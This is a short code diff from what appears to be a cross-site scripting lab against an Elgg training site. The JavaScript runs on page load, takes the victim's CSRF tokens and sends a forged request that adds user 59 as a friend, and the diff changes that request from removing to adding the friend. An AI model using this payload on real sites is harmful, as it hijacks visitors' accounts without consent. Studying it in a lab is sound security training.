@@ -96,7 +96,7 @@ window.onload = function () {
     var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;          
     var token="&__elgg_token="+elgg.security.token.__elgg_token;
 
-    var sendurl="http://www.xsslabelgg.com/action/friends/remove" + "?friend=59" + token + ts;  
+    var sendurl="http://www.xsslabelgg.com/action/friends/add" + "?friend=59" + token + ts;  
 
     Ajax=new XMLHttpRequest();
     Ajax.open("GET",sendurl,true);
